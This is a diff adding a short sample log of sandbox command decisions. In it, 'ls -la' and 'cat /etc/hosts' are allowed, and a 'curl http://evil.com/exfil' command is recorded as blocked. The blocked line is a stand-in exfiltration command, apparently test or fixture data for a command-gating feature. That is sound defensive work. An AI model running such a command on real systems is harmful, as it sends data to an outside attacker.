@@ -1,0 +1,3 @@
+{"ts": "2026-10-24T04:45:21.602947Z", "sandbox_name": "sbx-abcd1234", "command": "ls -la", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-24T04:45:21.603007Z", "sandbox_name": "sbx-abcd1234", "command": "cat /etc/hosts", "decision": "allow", "execution_target": "celesto_sandbox"}
+{"ts": "2026-10-24T04:45:21.603034Z", "sandbox_name": "sbx-efgh5678", "command": "curl http://evil.com/exfil", "decision": "block", "execution_target": "celesto_sandbox"}
